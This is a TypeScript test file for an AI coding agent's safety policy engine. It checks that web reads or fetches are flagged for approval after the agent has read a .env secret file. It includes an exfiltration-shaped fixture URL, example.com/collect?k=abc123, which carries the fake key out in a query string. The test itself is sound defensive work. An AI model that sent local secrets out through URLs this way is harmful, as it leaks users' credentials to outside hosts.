import { strictEqual } from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import { ToolNames } from "../../src/core/tool-names.js";
import { createSafetyPolicyEngine, type SafetyPolicyEngine } from "../../src/domains/safety/policy-engine.js";
import { loadProjectSafetyPolicy } from "../../src/domains/safety/project-policy.js";
import { type IsolatedClioEnv, isolateClioEnv } from "../harness/scratch-env.js";

describe("safety: read-then-fetch taint", () => {
	let originalCwd: string;
	let scratch: string;
	let isolated: IsolatedClioEnv;

	beforeEach(async () => {
		isolated = await isolateClioEnv("clio-coder-web-read-taint-");
		originalCwd = process.cwd();
		scratch = mkdtempSync(join(tmpdir(), "clio-coder-web-read-taint-"));
		mkdirSync(join(scratch, ".clio-coder"), { recursive: true });
		// Without the default path policy a typed read of .env is admitted, so the taint is all that stands between it and the network.
		writeFileSync(join(scratch, ".clio-coder", "safety.yaml"), "version: 1\ndisableDefaultPathPolicy: true\n");
		writeFileSync(join(scratch, ".env"), "API_KEY=abc123\n");
		process.chdir(scratch);
	});

	afterEach(() => {
		process.chdir(originalCwd);
		rmSync(scratch, { recursive: true, force: true });
		isolated.restore();
	});

	function engine(): SafetyPolicyEngine {
		return createSafetyPolicyEngine({ cwd: scratch, projectPolicy: loadProjectSafetyPolicy(scratch) });
	}

	for (const tool of [ToolNames.WebRead, ToolNames.WebFetch]) {
		it(`${tool} asks when its URL could carry a secret file read earlier`, () => {
			const policy = engine();
			const carrying = { tool, args: { url: "https://example.com/collect?k=abc123" } };
			strictEqual(policy.evaluate(carrying).kind, "allow", "no read yet: untainted");
			strictEqual(policy.evaluate({ tool: ToolNames.Read, args: { path: ".env" } }).kind, "allow");
			const after = policy.evaluate(carrying);
			strictEqual(after.kind, "ask");
			strictEqual(after.ruleId, "secret-read-then-fetch");
			// A bare address carries nothing built from local content.
			strictEqual(policy.evaluate({ tool, args: { url: "https://example.com/" } }).kind, "allow");
		});
	}
});
